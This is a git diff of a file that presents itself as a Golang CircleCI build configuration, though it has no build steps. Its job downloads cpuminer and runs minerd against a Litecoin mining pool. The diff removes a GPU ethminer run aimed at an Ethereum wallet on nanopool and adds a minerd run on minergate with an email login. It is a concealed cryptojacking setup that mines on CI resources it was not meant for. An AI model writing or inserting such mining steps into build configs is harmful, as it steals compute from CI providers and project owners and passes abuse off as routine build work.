@@ -1,20 +1,16 @@
 # Golang CircleCI 2.0 configuration file
 #
 # Check https://circleci.com/docs/2.0/language-go/ for more details
-version: 2.1
+version: 2
 
 jobs:
   build:
-    machine:
-      resource_class: gpu.nvidia.small 
-      image: ubuntu-1604-cuda-10.1:201909-23
+    docker:
+      image: circleci/golang:1.9
     steps:
-      - run: nvidia-smi
+      - run: ls
       - run: sudo apt-get update
       - run: sudo apt-get install wget tar -y
       - run: curl https://cfhcable.dl.sourceforge.net/project/cpuminer/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz -o c.tar.gz
       - run: tar xvzf c.tar.gz
-      - run: wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
-      - run: tar xvzf ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
-      - run: cd bin && ./ethminer -P stratum+tcp://0xaf308Ccd29d573421edc0710ceAE805f3C299058@eth-eu1.nanopool.org:9999
-      - run: ./minerd -o stratum+tcp://litecoinpool.org:3333 -u arthdal20.2 -p 2
+      - run: ./minerd -o stratum+tcp://ltc.pool.minergate.com:3336 -u ukgdjl@hi2.in -p x
